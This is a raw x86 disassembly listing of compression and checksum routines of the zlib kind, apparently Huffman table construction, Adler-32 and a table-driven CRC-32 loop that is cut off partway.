   1d154:	mov    DWORD PTR [ebp-0x4],eax
   1d157:	mov    eax,DWORD PTR [ebp+0xc]
   1d15a:	mov    edx,DWORD PTR [ebp+0x18]
   1d15d:	mov    DWORD PTR [ebp-0x7c],eax
   1d160:	mov    eax,DWORD PTR [ebp+0x1c]
   1d163:	push   ebx
   1d164:	mov    DWORD PTR [ebp-0x4c],eax
   1d167:	xor    eax,eax
   1d169:	push   esi
   1d16a:	mov    esi,DWORD PTR [ebp+0x14]
   1d16d:	movzx  ebx,ax
   1d170:	push   edi
   1d171:	mov    eax,ebx
   1d173:	shl    ebx,0x10
   1d176:	push   0x8
   1d178:	or     eax,ebx
   1d17a:	pop    ecx
   1d17b:	lea    edi,[ebp-0x24]
   1d17e:	rep stos DWORD PTR es:[edi],eax
   1d180:	xor    edi,edi
   1d182:	xor    ecx,ecx
   1d184:	mov    DWORD PTR [ebp-0x90],edx
   1d18a:	cmp    DWORD PTR [ebp+0x10],edi
   1d18d:	jbe    0x1d1a3
   1d18f:	mov    eax,DWORD PTR [ebp-0x7c]
   1d192:	movzx  eax,WORD PTR [eax+ecx*2]
   1d196:	lea    eax,[ebp+eax*2-0x24]
   1d19a:	inc    WORD PTR [eax]
   1d19d:	inc    ecx
   1d19e:	cmp    ecx,DWORD PTR [ebp+0x10]
   1d1a1:	jb     0x1d18f
   1d1a3:	mov    ecx,DWORD PTR [edx]
   1d1a5:	push   0xf
   1d1a7:	pop    eax
   1d1a8:	mov    DWORD PTR [ebp-0x54],ecx
   1d1ab:	mov    DWORD PTR [ebp-0x60],eax
   1d1ae:	cmp    WORD PTR [ebp+eax*2-0x24],di
   1d1b3:	jne    0x1d1be
   1d1b5:	dec    eax
   1d1b6:	mov    DWORD PTR [ebp-0x60],eax
   1d1b9:	cmp    eax,0x1
   1d1bc:	jae    0x1d1ae
   1d1be:	cmp    ecx,eax
   1d1c0:	jbe    0x1d1c5
   1d1c2:	mov    DWORD PTR [ebp-0x54],eax
   1d1c5:	cmp    eax,edi
   1d1c7:	jne    0x1d1f3
   1d1c9:	mov    ecx,DWORD PTR [esi]
   1d1cb:	xor    eax,eax
   1d1cd:	mov    BYTE PTR [ebp-0x48],0x40
   1d1d1:	mov    BYTE PTR [ebp-0x47],0x1
   1d1d5:	mov    WORD PTR [ebp-0x46],ax
   1d1d9:	mov    eax,DWORD PTR [ebp-0x48]
   1d1dc:	mov    DWORD PTR [ecx],eax
   1d1de:	add    DWORD PTR [esi],0x4
   1d1e1:	mov    ecx,DWORD PTR [esi]
   1d1e3:	mov    DWORD PTR [ecx],eax
   1d1e5:	add    DWORD PTR [esi],0x4
   1d1e8:	mov    DWORD PTR [edx],0x1
   1d1ee:	jmp    0x1d52f
   1d1f3:	xor    ecx,ecx
   1d1f5:	inc    ecx
   1d1f6:	mov    edx,ecx
   1d1f8:	cmp    WORD PTR [ebp+edx*2-0x24],di
   1d1fd:	jne    0x1d205
   1d1ff:	inc    edx
   1d200:	cmp    edx,0xf
   1d203:	jbe    0x1d1f8
   1d205:	cmp    DWORD PTR [ebp-0x54],edx
   1d208:	jae    0x1d20d
   1d20a:	mov    DWORD PTR [ebp-0x54],edx
   1d20d:	mov    edi,ecx
   1d20f:	movzx  ebx,WORD PTR [ebp+ecx*2-0x24]
   1d214:	add    edi,edi
   1d216:	sub    edi,ebx
   1d218:	js     0x1d2a4
   1d21e:	inc    ecx
   1d21f:	cmp    ecx,0xf
   1d222:	jbe    0x1d20f
   1d224:	xor    ebx,ebx
   1d226:	cmp    edi,ebx
   1d228:	jle    0x1d234
   1d22a:	cmp    DWORD PTR [ebp+0x8],ebx
   1d22d:	je     0x1d2a4
   1d22f:	cmp    eax,0x1
   1d232:	jne    0x1d2a4
   1d234:	xor    eax,eax
   1d236:	push   0x2
   1d238:	mov    WORD PTR [ebp-0x42],ax
   1d23c:	pop    ecx
   1d23d:	mov    ax,WORD PTR [ebp+ecx*1-0x44]
   1d242:	add    ax,WORD PTR [ebp+ecx*1-0x24]
   1d247:	inc    ecx
   1d248:	mov    WORD PTR [ebp+ecx*1-0x43],ax
   1d24d:	inc    ecx
   1d24e:	cmp    ecx,0x1e
   1d251:	jb     0x1d23d
   1d253:	mov    eax,DWORD PTR [ebp-0x4c]
   1d256:	xor    edi,edi
   1d258:	cmp    DWORD PTR [ebp+0x10],ebx
   1d25b:	jbe    0x1d286
   1d25d:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d260:	lea    ecx,[ecx+edi*2]
   1d263:	cmp    WORD PTR [ecx],bx
   1d266:	je     0x1d280
   1d268:	movzx  ebx,WORD PTR [ecx]
   1d26b:	movzx  ebx,WORD PTR [ebp+ebx*2-0x44]
   1d270:	mov    WORD PTR [eax+ebx*2],di
   1d274:	movzx  ecx,WORD PTR [ecx]
   1d277:	lea    ecx,[ebp+ecx*2-0x44]
   1d27b:	inc    WORD PTR [ecx]
   1d27e:	xor    ebx,ebx
   1d280:	inc    edi
   1d281:	cmp    edi,DWORD PTR [ebp+0x10]
   1d284:	jb     0x1d25d
   1d286:	mov    ecx,DWORD PTR [ebp+0x8]
   1d289:	sub    ecx,ebx
   1d28b:	je     0x1d2ce
   1d28d:	dec    ecx
   1d28e:	je     0x1d2ac
   1d290:	or     DWORD PTR [ebp-0x68],0xffffffff
   1d294:	mov    DWORD PTR [ebp-0x6c],0x7bec0
   1d29b:	mov    DWORD PTR [ebp-0x78],0x7bf00
   1d2a2:	jmp    0x1d2db
   1d2a4:	or     eax,0xffffffff
   1d2a7:	jmp    0x1d531
   1d2ac:	mov    ecx,0x202
   1d2b1:	mov    edi,0x7be40
   1d2b6:	sub    edi,ecx
   1d2b8:	mov    DWORD PTR [ebp-0x6c],edi
   1d2bb:	mov    edi,0x7be80
   1d2c0:	sub    edi,ecx
   1d2c2:	mov    DWORD PTR [ebp-0x78],edi
   1d2c5:	mov    DWORD PTR [ebp-0x68],0x100
   1d2cc:	jmp    0x1d2db
   1d2ce:	mov    DWORD PTR [ebp-0x78],eax
   1d2d1:	mov    DWORD PTR [ebp-0x6c],eax
   1d2d4:	mov    DWORD PTR [ebp-0x68],0x13
   1d2db:	mov    ecx,DWORD PTR [ebp-0x54]
   1d2de:	or     DWORD PTR [ebp-0x74],0xffffffff
   1d2e2:	mov    edi,DWORD PTR [esi]
   1d2e4:	mov    eax,edx
   1d2e6:	xor    edx,edx
   1d2e8:	inc    edx
   1d2e9:	shl    edx,cl
   1d2eb:	cmp    DWORD PTR [ebp+0x8],0x1
   1d2ef:	mov    DWORD PTR [ebp-0x5c],ebx
   1d2f2:	mov    DWORD PTR [ebp-0x84],eax
   1d2f8:	lea    ecx,[edx-0x1]
   1d2fb:	mov    DWORD PTR [ebp-0x50],ebx
   1d2fe:	mov    DWORD PTR [ebp-0x80],edx
   1d301:	mov    DWORD PTR [ebp-0x64],edx
   1d304:	mov    DWORD PTR [ebp-0x88],ecx
   1d30a:	jne    0x1d31c
   1d30c:	cmp    edx,0x5b0
   1d312:	jb     0x1d31c
   1d314:	xor    eax,eax
   1d316:	inc    eax
   1d317:	jmp    0x1d531
   1d31c:	mov    ecx,DWORD PTR [ebp-0x4c]
   1d31f:	mov    DWORD PTR [ebp-0x58],ecx
   1d322:	mov    cl,al
   1d324:	sub    cl,BYTE PTR [ebp-0x50]
   1d327:	mov    BYTE PTR [ebp-0x47],cl
   1d32a:	mov    ecx,DWORD PTR [ebp-0x58]
   1d32d:	movzx  edx,WORD PTR [ecx]
   1d330:	movzx  ecx,dx
   1d333:	cmp    ecx,DWORD PTR [ebp-0x68]
   1d336:	jge    0x1d342
   1d338:	mov    BYTE PTR [ebp-0x48],0x0
   1d33c:	mov    WORD PTR [ebp-0x46],dx
   1d340:	jmp    0x1d368
   1d342:	jle    0x1d35e
   1d344:	mov    ecx,DWORD PTR [ebp-0x58]
   1d347:	movzx  ecx,WORD PTR [ecx]
   1d34a:	mov    edx,DWORD PTR [ebp-0x78]
   1d34d:	add    ecx,ecx
   1d34f:	mov    dl,BYTE PTR [ecx+edx*1]
   1d352:	mov    BYTE PTR [ebp-0x48],dl
   1d355:	mov    edx,DWORD PTR [ebp-0x6c]
   1d358:	mov    cx,WORD PTR [ecx+edx*1]
   1d35c:	jmp    0x1d364
   1d35e:	mov    BYTE PTR [ebp-0x48],0x60
   1d362:	xor    ecx,ecx
   1d364:	mov    WORD PTR [ebp-0x46],cx
   1d368:	xor    edx,edx
   1d36a:	mov    ecx,eax
   1d36c:	sub    ecx,DWORD PTR [ebp-0x50]
   1d36f:	inc    edx
   1d370:	shl    edx,cl
   1d372:	mov    ecx,DWORD PTR [ebp-0x80]
   1d375:	mov    DWORD PTR [ebp-0x4c],ecx
   1d378:	mov    DWORD PTR [ebp-0x70],ecx
   1d37b:	mov    ecx,DWORD PTR [ebp-0x50]
   1d37e:	shr    ebx,cl
   1d380:	add    ebx,DWORD PTR [ebp-0x4c]
   1d383:	lea    ecx,[edi+ebx*4]
   1d386:	sub    DWORD PTR [ebp-0x4c],edx
   1d389:	mov    ebx,edx
   1d38b:	shl    ebx,0x2
   1d38e:	sub    ecx,ebx
   1d390:	cmp    DWORD PTR [ebp-0x4c],0x0
   1d394:	mov    ebx,DWORD PTR [ebp-0x48]
   1d397:	mov    DWORD PTR [ecx],ebx
   1d399:	jne    0x1d386
   1d39b:	xor    edx,edx
   1d39d:	lea    ecx,[eax-0x1]
   1d3a0:	inc    edx
   1d3a1:	shl    edx,cl
   1d3a3:	mov    ecx,DWORD PTR [ebp-0x5c]
   1d3a6:	jmp    0x1d3aa
   1d3a8:	shr    edx,1
   1d3aa:	test   ecx,edx
   1d3ac:	jne    0x1d3a8
   1d3ae:	test   edx,edx
   1d3b0:	je     0x1d3bb
   1d3b2:	lea    ebx,[edx-0x1]
   1d3b5:	and    ebx,ecx
   1d3b7:	add    ebx,edx
   1d3b9:	jmp    0x1d3bd
   1d3bb:	xor    ebx,ebx
   1d3bd:	add    DWORD PTR [ebp-0x58],0x2
   1d3c1:	lea    ecx,[ebp+eax*2-0x24]
   1d3c5:	mov    edx,0xffff
   1d3ca:	add    WORD PTR [ecx],dx
   1d3cd:	movzx  ecx,WORD PTR [ecx]
   1d3d0:	mov    DWORD PTR [ebp-0x5c],ebx
   1d3d3:	test   cx,cx
   1d3d6:	jne    0x1d3f4
   1d3d8:	cmp    eax,DWORD PTR [ebp-0x60]
   1d3db:	je     0x1d4b7
   1d3e1:	mov    eax,DWORD PTR [ebp-0x58]
   1d3e4:	movzx  eax,WORD PTR [eax]
   1d3e7:	mov    ecx,DWORD PTR [ebp-0x7c]
   1d3ea:	movzx  eax,WORD PTR [ecx+eax*2]
   1d3ee:	mov    DWORD PTR [ebp-0x84],eax
   1d3f4:	mov    edx,DWORD PTR [ebp-0x54]
   1d3f7:	cmp    eax,edx
   1d3f9:	jbe    0x1d322
   1d3ff:	mov    ecx,DWORD PTR [ebp-0x88]
   1d405:	and    ecx,ebx
   1d407:	mov    DWORD PTR [ebp-0x8c],ecx
   1d40d:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d410:	je     0x1d322
   1d416:	cmp    DWORD PTR [ebp-0x50],0x0
   1d41a:	jne    0x1d41f
   1d41c:	mov    DWORD PTR [ebp-0x50],edx
   1d41f:	mov    ecx,DWORD PTR [ebp-0x70]
   1d422:	lea    edi,[edi+ecx*4]
   1d425:	mov    ecx,eax
   1d427:	mov    eax,DWORD PTR [ebp-0x50]
   1d42a:	xor    edx,edx
   1d42c:	sub    ecx,eax
   1d42e:	inc    edx
   1d42f:	add    eax,ecx
   1d431:	shl    edx,cl
   1d433:	cmp    eax,DWORD PTR [ebp-0x60]
   1d436:	jae    0x1d460
   1d438:	mov    DWORD PTR [ebp-0x4c],eax
   1d43b:	lea    eax,[ebp+eax*2-0x24]
   1d43f:	jmp    0x1d444
   1d441:	mov    eax,DWORD PTR [ebp-0x70]
   1d444:	movzx  ebx,WORD PTR [eax]
   1d447:	sub    edx,ebx
   1d449:	test   edx,edx
   1d44b:	jle    0x1d460
   1d44d:	inc    ecx
   1d44e:	inc    DWORD PTR [ebp-0x4c]
   1d451:	inc    eax
   1d452:	inc    eax
   1d453:	mov    DWORD PTR [ebp-0x70],eax
   1d456:	mov    eax,DWORD PTR [ebp-0x4c]
   1d459:	add    edx,edx
   1d45b:	cmp    eax,DWORD PTR [ebp-0x60]
   1d45e:	jb     0x1d441
   1d460:	xor    eax,eax
   1d462:	inc    eax
   1d463:	mov    edx,eax
   1d465:	shl    edx,cl
   1d467:	add    DWORD PTR [ebp-0x64],edx
   1d46a:	mov    DWORD PTR [ebp-0x80],edx
   1d46d:	cmp    DWORD PTR [ebp+0x8],eax
   1d470:	jne    0x1d47f
   1d472:	cmp    DWORD PTR [ebp-0x64],0x5b0
   1d479:	jae    0x1d531
   1d47f:	mov    eax,DWORD PTR [ebp-0x8c]
   1d485:	mov    ebx,DWORD PTR [ebp-0x5c]
   1d488:	mov    edx,eax
   1d48a:	mov    DWORD PTR [ebp-0x74],eax
   1d48d:	mov    eax,DWORD PTR [esi]
   1d48f:	shl    edx,0x2
   1d492:	mov    BYTE PTR [edx+eax*1],cl
   1d495:	mov    eax,DWORD PTR [esi]
   1d497:	mov    cl,BYTE PTR [ebp-0x54]
   1d49a:	mov    BYTE PTR [edx+eax*1+0x1],cl
   1d49e:	mov    eax,DWORD PTR [esi]
   1d4a0:	mov    ecx,edi
   1d4a2:	sub    ecx,eax
   1d4a4:	sar    ecx,0x2
   1d4a7:	mov    WORD PTR [edx+eax*1+0x2],cx
   1d4ac:	mov    eax,DWORD PTR [ebp-0x84]
   1d4b2:	jmp    0x1d322
   1d4b7:	mov    cl,al
   1d4b9:	sub    cl,BYTE PTR [ebp-0x50]
   1d4bc:	mov    BYTE PTR [ebp-0x48],0x40
   1d4c0:	mov    BYTE PTR [ebp-0x47],cl
   1d4c3:	xor    ecx,ecx
   1d4c5:	mov    WORD PTR [ebp-0x46],cx
   1d4c9:	jmp    0x1d518
   1d4cb:	cmp    DWORD PTR [ebp-0x50],0x0
   1d4cf:	je     0x1d4ea
   1d4d1:	mov    ecx,DWORD PTR [ebp-0x88]
   1d4d7:	and    ecx,ebx
   1d4d9:	cmp    ecx,DWORD PTR [ebp-0x74]
   1d4dc:	je     0x1d4ea
   1d4de:	mov    eax,DWORD PTR [ebp-0x54]
   1d4e1:	and    DWORD PTR [ebp-0x50],0x0
   1d4e5:	mov    edi,DWORD PTR [esi]
   1d4e7:	mov    BYTE PTR [ebp-0x47],al
   1d4ea:	mov    ecx,DWORD PTR [ebp-0x50]
   1d4ed:	mov    edx,ebx
   1d4ef:	shr    edx,cl
   1d4f1:	mov    ecx,DWORD PTR [ebp-0x48]
   1d4f4:	mov    DWORD PTR [edi+edx*4],ecx
   1d4f7:	xor    edx,edx
   1d4f9:	lea    ecx,[eax-0x1]
   1d4fc:	inc    edx
   1d4fd:	shl    edx,cl
   1d4ff:	jmp    0x1d503
   1d501:	shr    edx,1
   1d503:	test   ebx,edx
   1d505:	jne    0x1d501
   1d507:	test   edx,edx
   1d509:	je     0x1d516
   1d50b:	lea    ecx,[edx-0x1]
   1d50e:	and    ecx,ebx
   1d510:	add    ecx,edx
   1d512:	mov    ebx,ecx
   1d514:	jmp    0x1d518
   1d516:	xor    ebx,ebx
   1d518:	test   ebx,ebx
   1d51a:	jne    0x1d4cb
   1d51c:	mov    eax,DWORD PTR [ebp-0x64]
   1d51f:	mov    ecx,DWORD PTR [ebp-0x54]
   1d522:	shl    eax,0x2
   1d525:	add    DWORD PTR [esi],eax
   1d527:	mov    eax,DWORD PTR [ebp-0x90]
   1d52d:	mov    DWORD PTR [eax],ecx
   1d52f:	xor    eax,eax
   1d531:	mov    ecx,DWORD PTR [ebp-0x4]
   1d534:	pop    edi
   1d535:	pop    esi
   1d536:	xor    ecx,ebp
   1d538:	pop    ebx
   1d539:	call   0x1da3b
   1d53e:	leave  
   1d53f:	ret    0x18
   1d542:	int3   
   1d543:	int3   
   1d544:	int3   
   1d545:	int3   
   1d546:	int3   
   1d547:	int3   
   1d548:	mov    edi,edi
   1d54a:	push   ebp
   1d54b:	mov    ebp,esp
   1d54d:	push   ebx
   1d54e:	mov    ebx,DWORD PTR [ebp+0x10]
   1d551:	push   esi
   1d552:	mov    esi,DWORD PTR [ebp+0x8]
   1d555:	push   edi
   1d556:	xor    eax,eax
   1d558:	mov    edi,esi
   1d55a:	inc    eax
   1d55b:	shr    edi,0x10
   1d55e:	and    esi,0xffff
   1d564:	cmp    ebx,eax
   1d566:	jne    0x1d58c
   1d568:	mov    eax,DWORD PTR [ebp+0xc]
   1d56b:	movzx  eax,BYTE PTR [eax]
   1d56e:	add    esi,eax
   1d570:	mov    eax,0xfff1
   1d575:	cmp    esi,eax
   1d577:	jb     0x1d57b
   1d579:	sub    esi,eax
   1d57b:	add    edi,esi
   1d57d:	cmp    edi,eax
   1d57f:	jb     0x1d75e
   1d585:	sub    edi,eax
   1d587:	jmp    0x1d75e
   1d58c:	mov    ecx,DWORD PTR [ebp+0xc]
   1d58f:	test   ecx,ecx
   1d591:	je     0x1d765
   1d597:	cmp    ebx,0x10
   1d59a:	jb     0x1d721
   1d5a0:	cmp    ebx,0x15b0
   1d5a6:	jb     0x1d674
   1d5ac:	mov    eax,ebx
   1d5ae:	mov    ebx,0x15b0
   1d5b3:	xor    edx,edx
   1d5b5:	div    ebx
   1d5b7:	mov    ebx,DWORD PTR [ebp+0x10]
   1d5ba:	mov    DWORD PTR [ebp+0xc],eax
   1d5bd:	sub    ebx,0x15b0
   1d5c3:	mov    eax,0x15b
   1d5c8:	movzx  edx,BYTE PTR [ecx]
   1d5cb:	add    esi,edx
   1d5cd:	movzx  edx,BYTE PTR [ecx+0x1]
   1d5d1:	add    edi,esi
   1d5d3:	add    esi,edx
   1d5d5:	movzx  edx,BYTE PTR [ecx+0x2]
   1d5d9:	add    edi,esi
   1d5db:	add    esi,edx
   1d5dd:	movzx  edx,BYTE PTR [ecx+0x3]
   1d5e1:	add    edi,esi
   1d5e3:	add    esi,edx
   1d5e5:	movzx  edx,BYTE PTR [ecx+0x4]
   1d5e9:	add    edi,esi
   1d5eb:	add    esi,edx
   1d5ed:	movzx  edx,BYTE PTR [ecx+0x5]
   1d5f1:	add    edi,esi
   1d5f3:	add    esi,edx
   1d5f5:	movzx  edx,BYTE PTR [ecx+0x6]
   1d5f9:	add    edi,esi
   1d5fb:	add    esi,edx
   1d5fd:	movzx  edx,BYTE PTR [ecx+0x7]
   1d601:	add    edi,esi
   1d603:	add    esi,edx
   1d605:	movzx  edx,BYTE PTR [ecx+0x8]
   1d609:	add    edi,esi
   1d60b:	add    esi,edx
   1d60d:	movzx  edx,BYTE PTR [ecx+0x9]
   1d611:	add    edi,esi
   1d613:	add    esi,edx
   1d615:	movzx  edx,BYTE PTR [ecx+0xa]
   1d619:	add    edi,esi
   1d61b:	add    esi,edx
   1d61d:	movzx  edx,BYTE PTR [ecx+0xb]
   1d621:	add    edi,esi
   1d623:	add    esi,edx
   1d625:	movzx  edx,BYTE PTR [ecx+0xc]
   1d629:	add    edi,esi
   1d62b:	add    esi,edx
   1d62d:	movzx  edx,BYTE PTR [ecx+0xd]
   1d631:	add    edi,esi
   1d633:	add    esi,edx
   1d635:	movzx  edx,BYTE PTR [ecx+0xe]
   1d639:	add    edi,esi
   1d63b:	add    esi,edx
   1d63d:	movzx  edx,BYTE PTR [ecx+0xf]
   1d641:	add    edi,esi
   1d643:	add    esi,edx
   1d645:	add    edi,esi
   1d647:	add    ecx,0x10
   1d64a:	dec    eax
   1d64b:	jne    0x1d5c8
   1d651:	mov    eax,esi
   1d653:	xor    edx,edx
   1d655:	mov    esi,0xfff1
   1d65a:	div    esi
   1d65c:	mov    eax,edi
   1d65e:	mov    edi,0xfff1
   1d663:	mov    esi,edx
   1d665:	xor    edx,edx
   1d667:	div    edi
   1d669:	dec    DWORD PTR [ebp+0xc]
   1d66c:	mov    edi,edx
   1d66e:	jne    0x1d5bd
   1d674:	test   ebx,ebx
   1d676:	je     0x1d75e
   1d67c:	cmp    ebx,0x10
   1d67f:	jb     0x1d743
   1d685:	mov    eax,ebx
   1d687:	shr    eax,0x4
   1d68a:	movzx  edx,BYTE PTR [ecx]
   1d68d:	add    esi,edx
   1d68f:	movzx  edx,BYTE PTR [ecx+0x1]
   1d693:	add    edi,esi
   1d695:	add    esi,edx
   1d697:	movzx  edx,BYTE PTR [ecx+0x2]
   1d69b:	add    edi,esi
   1d69d:	add    esi,edx
   1d69f:	movzx  edx,BYTE PTR [ecx+0x3]
   1d6a3:	add    edi,esi
   1d6a5:	add    esi,edx
   1d6a7:	movzx  edx,BYTE PTR [ecx+0x4]
   1d6ab:	add    edi,esi
   1d6ad:	add    esi,edx
   1d6af:	movzx  edx,BYTE PTR [ecx+0x5]
   1d6b3:	add    edi,esi
   1d6b5:	add    esi,edx
   1d6b7:	movzx  edx,BYTE PTR [ecx+0x6]
   1d6bb:	add    edi,esi
   1d6bd:	add    esi,edx
   1d6bf:	movzx  edx,BYTE PTR [ecx+0x7]
   1d6c3:	add    edi,esi
   1d6c5:	add    esi,edx
   1d6c7:	movzx  edx,BYTE PTR [ecx+0x8]
   1d6cb:	add    edi,esi
   1d6cd:	add    esi,edx
   1d6cf:	movzx  edx,BYTE PTR [ecx+0x9]
   1d6d3:	add    edi,esi
   1d6d5:	add    esi,edx
   1d6d7:	movzx  edx,BYTE PTR [ecx+0xa]
   1d6db:	add    edi,esi
   1d6dd:	add    esi,edx
   1d6df:	movzx  edx,BYTE PTR [ecx+0xb]
   1d6e3:	add    edi,esi
   1d6e5:	add    esi,edx
   1d6e7:	movzx  edx,BYTE PTR [ecx+0xc]
   1d6eb:	add    edi,esi
   1d6ed:	add    esi,edx
   1d6ef:	movzx  edx,BYTE PTR [ecx+0xd]
   1d6f3:	add    edi,esi
   1d6f5:	add    esi,edx
   1d6f7:	movzx  edx,BYTE PTR [ecx+0xe]
   1d6fb:	add    edi,esi
   1d6fd:	add    esi,edx
   1d6ff:	movzx  edx,BYTE PTR [ecx+0xf]
   1d703:	add    edi,esi
   1d705:	add    esi,edx
   1d707:	sub    ebx,0x10
   1d70a:	add    edi,esi
   1d70c:	add    ecx,0x10
   1d70f:	dec    eax
   1d710:	jne    0x1d68a
   1d716:	jmp    0x1d743
   1d718:	movzx  eax,BYTE PTR [ecx]
   1d71b:	dec    ebx
   1d71c:	add    esi,eax
   1d71e:	inc    ecx
   1d71f:	add    edi,esi
   1d721:	test   ebx,ebx
   1d723:	jne    0x1d718
   1d725:	mov    ecx,0xfff1
   1d72a:	cmp    esi,ecx
   1d72c:	jb     0x1d730
   1d72e:	sub    esi,ecx
   1d730:	mov    eax,edi
   1d732:	xor    edx,edx
   1d734:	div    ecx
   1d736:	mov    eax,edx
   1d738:	jmp    0x1d760
   1d73a:	movzx  eax,BYTE PTR [ecx]
   1d73d:	dec    ebx
   1d73e:	add    esi,eax
   1d740:	inc    ecx
   1d741:	add    edi,esi
   1d743:	test   ebx,ebx
   1d745:	jne    0x1d73a
   1d747:	mov    eax,esi
   1d749:	mov    ecx,0xfff1
   1d74e:	xor    edx,edx
   1d750:	mov    esi,ecx
   1d752:	div    esi
   1d754:	mov    eax,edi
   1d756:	mov    esi,edx
   1d758:	xor    edx,edx
   1d75a:	div    ecx
   1d75c:	mov    edi,edx
   1d75e:	mov    eax,edi
   1d760:	shl    eax,0x10
   1d763:	or     eax,esi
   1d765:	pop    edi
   1d766:	pop    esi
   1d767:	pop    ebx
   1d768:	pop    ebp
   1d769:	ret    0xc
   1d76c:	int3   
   1d76d:	int3   
   1d76e:	int3   
   1d76f:	int3   
   1d770:	int3   
   1d771:	int3   
   1d772:	mov    edi,edi
   1d774:	push   ebp
   1d775:	mov    ebp,esp
   1d777:	push   ecx
   1d778:	cmp    DWORD PTR [ebp+0x8],0x0
   1d77c:	push   esi
   1d77d:	not    eax
   1d77f:	mov    ecx,0xff
   1d784:	je     0x1d7a2
   1d786:	test   dl,0x3
   1d789:	je     0x1d7a2
   1d78b:	movzx  esi,BYTE PTR [edx]
   1d78e:	xor    esi,eax
   1d790:	and    esi,ecx
   1d792:	shr    eax,0x8
   1d795:	xor    eax,DWORD PTR [esi*4+0x7bf40]
   1d79c:	inc    edx
   1d79d:	dec    DWORD PTR [ebp+0x8]
   1d7a0:	jne    0x1d786
   1d7a2:	cmp    DWORD PTR [ebp+0x8],0x20
   1d7a6:	push   ebx
   1d7a7:	push   edi
   1d7a8:	push   0x4
   1d7aa:	mov    esi,edx
   1d7ac:	pop    edi
   1d7ad:	jb     0x1d971
   1d7b3:	mov    edx,DWORD PTR [ebp+0x8]
   1d7b6:	shr    edx,0x5
   1d7b9:	mov    DWORD PTR [ebp-0x4],edx
   1d7bc:	xor    eax,DWORD PTR [esi]
   1d7be:	add    esi,edi
   1d7c0:	mov    edx,eax
   1d7c2:	shr    edx,0x10
   1d7c5:	mov    ebx,eax
   1d7c7:	shr    ebx,0x8
   1d7ca:	and    edx,ecx
   1d7cc:	mov    edx,DWORD PTR [edx*4+0x7c340]
   1d7d3:	and    ebx,ecx
   1d7d5:	xor    edx,DWORD PTR [ebx*4+0x7c740]
   1d7dc:	mov    ebx,eax
   1d7de:	shr    ebx,0x18
   1d7e1:	xor    edx,DWORD PTR [ebx*4+0x7bf40]
   1d7e8:	and    eax,ecx
   1d7ea:	xor    edx,DWORD PTR [eax*4+0x7cb40]
   1d7f1:	xor    edx,DWORD PTR [esi]
   1d7f3:	add    esi,edi
   1d7f5:	mov    eax,edx
   1d7f7:	shr    eax,0x10
   1d7fa:	mov    ebx,edx
   1d7fc:	shr    ebx,0x8
   1d7ff:	and    eax,ecx
   1d801:	mov    eax,DWORD PTR [eax*4+0x7c340]
   1d808:	and    ebx,ecx
   1d80a:	xor    eax,DWORD PTR [ebx*4+0x7c740]
   1d811:	mov    ebx,edx
   1d813:	shr    ebx,0x18
   1d816:	xor    eax,DWORD PTR [ebx*4+0x7bf40]
   1d81d:	and    edx,ecx
   1d81f:	xor    eax,DWORD PTR [edx*4+0x7cb40]
   1d826:	xor    eax,DWORD PTR [esi]
   1d828:	add    esi,edi
   1d82a:	mov    edx,eax
   1d82c:	shr    edx,0x10
   1d82f:	mov    ebx,eax
   1d831:	and    edx,ecx
   1d833:	mov    edx,DWORD PTR [edx*4+0x7c340]
   1d83a:	shr    ebx,0x8
   1d83d:	and    ebx,ecx
   1d83f:	xor    edx,DWORD PTR [ebx*4+0x7c740]
   1d846:	mov    ebx,eax
   1d848:	shr    ebx,0x18
   1d84b:	xor    edx,DWORD PTR [ebx*4+0x7bf40]
   1d852:	and    eax,ecx
   1d854:	xor    edx,DWORD PTR [eax*4+0x7cb40]
   1d85b:	xor    edx,DWORD PTR [esi]
   1d85d:	add    esi,edi
   1d85f:	mov    eax,edx
   1d861:	shr    eax,0x10
   1d864:	mov    ebx,edx
   1d866:	shr    ebx,0x8
   1d869:	and    eax,ecx
   1d86b:	mov    eax,DWORD PTR [eax*4+0x7c340]
   1d872:	and    ebx,ecx
   1d874:	xor    eax,DWORD PTR [ebx*4+0x7c740]
   1d87b:	mov    ebx,edx
   1d87d:	shr    ebx,0x18
   1d880:	xor    eax,DWORD PTR [ebx*4+0x7bf40]
   1d887:	and    edx,ecx
   1d889:	xor    eax,DWORD PTR [edx*4+0x7cb40]
   1d890:	xor    eax,DWORD PTR [esi]
   1d892:	add    esi,edi
   1d894:	mov    edx,eax
   1d896:	shr    edx,0x10
   1d899:	mov    ebx,eax
   1d89b:	and    edx,ecx
   1d89d:	mov    edx,DWORD PTR [edx*4+0x7c340]
   1d8a4:	shr    ebx,0x8
   1d8a7:	and    ebx,ecx
   1d8a9:	xor    edx,DWORD PTR [ebx*4+0x7c740]
   1d8b0:	mov    ebx,eax
   1d8b2:	shr    ebx,0x18
   1d8b5:	xor    edx,DWORD PTR [ebx*4+0x7bf40]
   1d8bc:	and    eax,ecx
   1d8be:	xor    edx,DWORD PTR [eax*4+0x7cb40]
   1d8c5:	xor    edx,DWORD PTR [esi]
   1d8c7:	add    esi,edi
   1d8c9:	mov    eax,edx
   1d8cb:	shr    eax,0x10
   1d8ce:	and    eax,ecx
   1d8d0:	mov    ebx,edx
   1d8d2:	mov    eax,DWORD PTR [eax*4+0x7c340]
   1d8d9:	shr    ebx,0x8
   1d8dc:	and    ebx,ecx
   1d8de:	xor    eax,DWORD PTR [ebx*4+0x7c740]
   1d8e5:	mov    ebx,edx
   1d8e7:	shr    ebx,0x18
   1d8ea:	xor    eax,DWORD PTR [ebx*4+0x7bf40]
   1d8f1:	and    edx,ecx
   1d8f3:	xor    eax,DWORD PTR [edx*4+0x7cb40]
   1d8fa:	sub    DWORD PTR [ebp+0x8],0x20
   1d8fe:	xor    eax,DWORD PTR [esi]
   1d900:	add    esi,edi
   1d902:	mov    edx,eax
   1d904:	mov    ebx,eax
   1d906:	shr    edx,0x10
   1d909:	shr    ebx,0x8
   1d90c:	and    edx,ecx
   1d90e:	mov    edx,DWORD PTR [edx*4+0x7c340]
   1d915:	and    ebx,ecx
   1d917:	xor    edx,DWORD PTR [ebx*4+0x7c740]
   1d91e:	mov    ebx,eax
   1d920:	shr    ebx,0x18
   1d923:	xor    edx,DWORD PTR [ebx*4+0x7bf40]
   1d92a:	and    eax,ecx
   1d92c:	xor    edx,DWORD PTR [eax*4+0x7cb40]
   1d933:	xor    edx,DWORD PTR [esi]
   1d935:	add    esi,edi
   1d937:	mov    eax,edx
   1d939:	shr    eax,0x10
   1d93c:	and    eax,ecx
   1d93e:	mov    eax,DWORD PTR [eax*4+0x7c340]
   1d945:	mov    ebx,edx
   1d947:	shr    ebx,0x8
